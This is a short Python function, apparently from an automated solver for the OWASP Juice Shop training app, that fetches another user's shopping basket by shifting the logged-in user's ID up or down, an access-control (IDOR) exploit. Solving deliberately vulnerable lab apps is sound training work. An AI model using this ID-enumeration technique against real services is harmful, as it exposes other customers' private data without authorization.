from src.util.authentication import *


def _get_basket_url(server):
    return "{}/rest/basket".format(server)


def access_another_user_basket(server, session):
    """
    If we're admin(ID 1), open basket 2. Anybody else, open the ID below us.
    :param server: juice shop URL
    :param session: Session
    """
    myid = get_current_user_id(server, session)
    if myid is 1:
        targetid = myid + 1
    else:
        targetid = myid - 1
    basket = session.get("{}/{}".format(_get_basket_url(server), targetid))
    if not basket.ok:
        raise RuntimeError("Error accessing basket {}".format(targetid))
